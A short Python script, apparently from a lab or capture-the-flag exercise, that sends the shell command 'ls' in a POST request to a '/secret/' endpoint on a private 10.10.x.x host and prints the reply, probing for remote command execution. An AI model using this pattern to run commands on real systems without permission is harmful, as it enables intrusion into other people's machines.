#!/usr/bin/env python3

import requests as r
import json

IP = "10.10.255.59"
URL = "http://{}/secret/".format(IP)
COMMAND = "'ls'"
response = r.post(URL, data=COMMAND)
print(response.text)